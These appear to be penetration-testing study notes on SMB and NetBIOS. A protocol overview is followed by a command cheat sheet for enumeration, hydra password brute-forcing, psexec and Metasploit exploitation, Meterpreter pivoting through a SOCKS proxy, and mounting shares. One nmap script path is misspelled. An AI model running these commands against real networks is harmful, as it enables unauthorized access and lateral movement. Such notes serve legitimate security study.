# 23 Networking Attacks

# SMB & NetBIOS Enumeration
Networking and file sharing

- While NetBIOS and SMB were once closely linked, modern networks rely primarily on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
- Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together.

### NetBIOS (Network Basic Input/Output)

- NetBIOS is an **API** and a **set of network protocols** for providing communication services **over a local network**. It's used primarily to allow applications on different computers to find and interact with each other on a network.
- Functions: NETBios offers three primary services:
	- Name Service (NetBIOS-NS): Allows computer to register, unregister, and resolve names in a local network.
	- Datagram Service (NetBIOS-DGM): Supports connectionless communication and broadcasting.
	- Session Service (NetBIOS-SSN): Supports connection-oriented communication for more reliable data transfers.
- Ports: NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139 (Session Service) over UDP and TCP.

### SMB (Server Message Block)

- SMB is a network file sharing protocol that allows computer on a network to share files, printers, and other resources. It is primary protocol used in Windows network for these purposes.
- Functions: SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.
- Versions: SMB has several versions:
	- SMB 1.0: The original version, which had security vulnerabilities. It was used with older operating systems like Windows XP.
	- SMB 2.0/2.1: Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
	- SMB 3.0+: Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
- Ports: SMB generally uses **port 445** for direct SMB traffic (bypassing NetBIOS) and **port 139** when operating **with NetBIOS**.

```shell
smbclient -L <ip>

nbtscan # scan network for NetBIOS name information
nmblookup # NetBIOS over TCP/IP client used to lookup NetBIOS names
ls -la /usr/share/nmapo/scripts | grep -e "smb-*" # Find nmap script for smb
nmap --script nbstat.nse # Send NetBIOS Name Service request
nmap --script smb-protocols # SMB Versions
nmap --script smb-security-mode # SMB Security levels
nmap --script smb-enum-users.nse 

hydra -L <user_file> -P <pass_file> <ip> smb 

psexec.py user@ip
msf6: exploit(windows/smb/psexec)
	meterpreter: run autoroute -s <target-ip>/subnet
	background
cat /etc/proxychains4.conf
msf6: auxiliary(server/socks_proxy)
netstat -antp # Active Internet connections
proxychains nmap -sT -Pn -sV -p 445 <ip>
msf6: sessions <Id>
meterpreter: shell
	net view <ip>
meterpreter: migrate -N explorer.exe
meterpreter: shell
	net view <ip> # View Share on Windows system
	net use <letter>: \\<ip>\share # Mount shares
	dir <letter> 
```

